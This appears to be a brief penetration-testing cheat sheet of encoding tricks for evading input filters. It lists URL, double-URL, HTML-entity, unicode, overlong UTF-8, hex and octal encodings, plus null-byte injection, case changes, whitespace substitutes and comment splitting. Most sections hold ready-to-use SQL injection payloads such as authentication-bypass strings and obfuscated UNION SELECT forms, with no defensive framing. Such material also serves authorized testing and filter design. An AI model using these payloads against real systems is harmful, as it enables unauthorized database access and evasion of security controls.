# Encoding Bypass Techniques

## 1. URL Encoding
```bash
# Single encoding
%27 -> '
%22 -> "
%3c -> <
%3e -> >
%26 -> &
%7c -> |
%3b -> ;
%0a -> newline
%0d -> carriage return
%00 -> null
```

## 2. Double URL Encoding
```bash
%2527 -> '
%2522 -> "
%253c -> <
%253e -> >
```

## 3. HTML Entity Encoding
```html
&#39; -> '
&#34; -> "
&#60; -> <
&#62; -> >
&#38; -> &
&#124; -> |
&#59; -> ;
&#10; -> newline
```

## 4. Unicode Encoding
```bash
\u0027 -> '
\u0022 -> "
\u003c -> <
\u003e -> >
```

## 5. UTF-8 Encoding
```bash
# Overlong encoding
%c0%ae -> .
%c0%af -> /
%c0%27 -> '
%c0%22 -> "
```

## 6. Base64 Encoding
```bash
echo -n "admin' OR '1'='1" | base64
# YWRtaW4nIE9SICcxJz0nMQ==
```

## 7. Hex Encoding
```bash
\x27 -> '
\x22 -> "
\x3c -> <
\x3e -> >
```

## 8. Octal Encoding
```bash
\047 -> '
\042 -> "
\074 -> <
\076 -> >
```

## 9. Mixed Encoding
```bash
%27 OR %271%27=%271
%27%20OR%20%271%27=%271
```

## 10. Null Byte Injection
```bash
%00
admin%00' OR '1'='1
```

## 11. Case Manipulation
```bash
SeLeCt
UNION
uNiOn
```

## 12. Whitespace Alternatives
```bash
%09 -> tab
%0a -> newline
%0d -> carriage return
%0b -> vertical tab
%0c -> form feed
%a0 -> non-breaking space (in some encodings)
```

## 13. Comment Bypass
```sql
UN/**/ION SEL/**/ECT
SEL/**/ECT
```

## 14. Inline Comment
```sql
/*!UNION*/ /*!SELECT*/
/*!50000UNION*/ /*!50000SELECT*/
```

## 15. JSON Encoding
```json
{"query": "admin' OR '1'='1"}
```

## 16. XML Encoding
```xml
<query>admin' OR '1'='1</query>
```
